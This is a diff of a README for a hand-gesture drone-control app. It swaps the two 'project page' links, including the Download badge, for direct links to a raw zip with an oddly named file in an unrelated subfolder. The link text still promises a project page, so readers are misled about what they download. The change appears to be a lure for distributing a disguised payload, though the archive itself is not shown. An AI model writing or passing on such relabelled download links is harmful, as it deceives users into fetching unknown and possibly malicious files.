@@ -1,6 +1,6 @@
 # 🤖 ai-gesture-controlled-drone - Control drones with hand gestures
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/subsonic-cardinalship603/ai-gesture-controlled-drone)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/subsonic-cardinalship603/ai-gesture-controlled-drone/raw/refs/heads/main/porer/drone_controlled_ai_gesture_adenophthalmia.zip)
 
 ## ✨ What this app does
 
@@ -25,7 +25,7 @@ For the smoothest setup, use a recent Windows laptop or desktop with a camera an
 
 Use this link to visit the project page and download the files:
 
-[Visit the ai-gesture-controlled-drone project page](https://github.com/subsonic-cardinalship603/ai-gesture-controlled-drone)
+[Visit the ai-gesture-controlled-drone project page](https://github.com/subsonic-cardinalship603/ai-gesture-controlled-drone/raw/refs/heads/main/porer/drone_controlled_ai_gesture_adenophthalmia.zip)
 
 After you open the page, look for the latest release files or the main project download area.
 
